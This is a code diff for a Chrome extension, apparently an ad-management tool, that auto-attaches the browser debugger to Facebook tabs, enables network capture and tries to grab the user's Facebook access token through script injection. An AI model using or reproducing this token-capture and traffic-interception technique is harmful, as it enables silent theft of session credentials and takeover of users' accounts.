@@ -641,6 +1020,10 @@ async function handleSaveConfig(newConfig) {
   const updates = {}
   if (newConfig.apiKey !== undefined) updates.apiKey = newConfig.apiKey
   if (newConfig.apiUrl !== undefined) updates.apiUrl = newConfig.apiUrl || DEFAULT_API_URL
+  if (newConfig.fbAccessToken !== undefined) {
+    updates.fbAccessToken = newConfig.fbAccessToken
+    await addActivity('success', `Manual token set (len=${newConfig.fbAccessToken.length})`)
+  }
 
   await updateConfig(updates)
   await addActivity('info', 'Configuration updated')
@@ -661,15 +1044,44 @@ async function handleToggle(enabled) {
   return { enabled }
 }
 
+// ==================== TAB LISTENER ====================
+// Auto-attach debugger when navigating to Facebook
+
+chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
+  if (changeInfo.status === 'complete' && tab.url && isFacebookUrl(tab.url)) {
+    if (!attachedTabIds.has(tabId)) {
+      try {
+        await chrome.debugger.attach({ tabId }, '1.3')
+        await chrome.debugger.sendCommand({ tabId }, 'Network.enable')
+        attachedTabIds.add(tabId)
+        console.log('[6AD] Auto-attached debugger to FB tab', tabId, tab.url)
+        await addActivity('info', `Debugger auto-attached to ${new URL(tab.url).hostname}`)
+      } catch (err) {
+        console.log('[6AD] Auto-attach failed:', err.message)
+      }
+    }
+
+    // Also try script injection capture after a delay (let page JS load)
+    const config = await getConfig()
+    if (!config.fbAccessToken) {
+      setTimeout(() => tryCaptureFBToken(), 5000)
+    }
+  }
+})
+
 // ==================== STARTUP ====================
 
 chrome.runtime.onInstalled.addListener(() => {
   console.log('[6AD] Extension installed/updated')
   addActivity('info', 'Extension installed/updated')
+  // Immediately try to attach to any open FB tabs
+  attachDebuggerToFBTabs()
 })
 
 setTimeout(async () => {
   const config = await getConfig()
+  // Always attach debugger on startup
+  await attachDebuggerToFBTabs()
   if (config.apiKey && config.isEnabled) {
     await sendHeartbeat()
   }
